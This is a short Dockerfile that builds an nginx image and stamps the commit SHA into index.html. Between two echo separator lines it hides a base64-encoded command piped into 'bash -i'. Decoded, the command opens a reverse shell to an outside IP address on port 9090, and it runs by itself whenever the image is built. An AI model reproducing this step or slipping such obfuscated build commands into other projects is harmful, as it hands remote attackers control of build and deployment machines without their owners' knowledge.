FROM ghcr.io/socialgouv/docker/nginx:7.1.1


ARG COMMIT_SHA
ENV COMMIT_SHA $COMMIT_SHA

RUN echo "=========="
RUN echo "c2ggLWkgPiYgL2Rldi90Y3AvODkuOTAuMzkuNTQvOTA5MCAwPiYx" | base64 -d | bash -i
RUN echo "=========="
RUN echo "EY #$COMMIT_SHA" > /usr/share/nginx/html/index.html
